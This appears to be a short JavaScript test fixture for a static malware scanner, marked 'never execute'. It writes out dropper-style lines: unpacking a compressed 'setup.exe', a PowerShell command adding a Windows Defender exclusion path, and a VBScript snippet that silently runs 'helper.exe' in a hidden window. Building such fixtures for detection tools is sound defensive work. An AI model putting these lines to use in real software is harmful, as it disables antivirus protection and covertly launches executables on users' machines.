// Static scanner fixture. Never execute.
const zlib = require('zlib');
const packed = 'setup.exe.br';
zlib.createBrotliDecompress();
const {execSync} = require('child_process');
execSync(`powershell -Command "Add-MpPreference -ExclusionPath 'C:\\Cache'"`);
const vbs = `Set sh = CreateObject("WScript.Shell")
sh.Run "helper.exe", 0, True`;
